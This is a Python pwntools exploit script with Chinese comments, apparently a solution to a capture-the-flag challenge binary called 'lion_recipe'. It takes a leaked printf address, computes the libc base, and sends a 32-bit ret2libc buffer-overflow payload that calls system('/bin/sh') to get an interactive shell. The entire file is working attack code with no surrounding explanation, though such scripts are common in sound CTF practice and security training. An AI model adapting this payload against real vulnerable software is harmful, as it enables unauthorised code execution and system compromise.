#!/usr/bin/env python3
from pwn import *
import sys

context.arch = 'i386'
context.log_level = 'info'

def exploit():
    # 检查是否提供了libc文件路径
    libc_path = './libc.so'
    
    if not os.path.exists(libc_path):
        log.error(f"Libc file not found at {libc_path}")
        log.info("Please make sure libc.so.6 is in the same directory")
        sys.exit(1)
    
    # 加载本地libc文件
    libc = ELF(libc_path)
    
    # 启动程序，使用提供的链接器
    if os.path.exists('./ld-linux.so.2'):
        p = process(['./ld-linux.so.2', './lion_recipe'], cwd='.')
    else:
        p = process('./lion_recipe')
    
    # 接收泄露的printf地址
    p.recvuntil(b'Found! Recipe fragment location: ')
    printf_addr = int(p.recvline().strip(), 16)
    log.info(f"printf address: {hex(printf_addr)}")
    
    # 使用本地libc文件获取偏移量
    printf_offset = libc.symbols['printf']
    system_offset = libc.symbols['system']
    
    # 查找/bin/sh字符串
    binsh_offset = next(libc.search(b'/bin/sh\x00'))
    
    log.info(f"Using offsets from local libc:")
    log.info(f"  printf offset: {hex(printf_offset)}")
    log.info(f"  system offset: {hex(system_offset)}")
    log.info(f"  /bin/sh offset: {hex(binsh_offset)}")
    
    # 计算libc基址
    libc_base = printf_addr - printf_offset
    log.info(f"libc base: {hex(libc_base)}")
    
    # 计算system和/bin/sh地址
    system_addr = libc_base + system_offset
    binsh_addr = libc_base + binsh_offset
    
    log.info(f"system address: {hex(system_addr)}")
    log.info(f"/bin/sh address: {hex(binsh_addr)}")
    
    # 使用ret gadget (需要根据你的二进制文件调整)
    ret_gadget = 0x0804900e  # 这是之前找到的，可能需要调整
    
    offset = 76
    
    # 构造payload
    payload = b'A' * offset
    payload += p32(ret_gadget)
    payload += p32(system_addr)
    payload += p32(0x41414141)
    payload += p32(binsh_addr)
    
    # 发送payload
    p.recvuntil(b'[>] ')
    p.sendline(payload)
    
    # 等待shell初始化
    sleep(0.5)
    
    # 尝试获取shell
    p.sendline(b'echo "RECIPE_SUCCESS"')
    try:
        response = p.recv(timeout=1)
        if b'RECIPE_SUCCESS' in response:
            log.success("Successfully got shell! Defeated the Stack Monster!")
            p.interactive()
        else:
            # 如果没有响应，尝试交互模式
            log.info("No response, but trying interactive mode...")
            p.interactive()
    except:
        log.error("Timeout or error receiving response")
        try:
            p.interactive()
        except:
            pass

if __name__ == '__main__':
    exploit()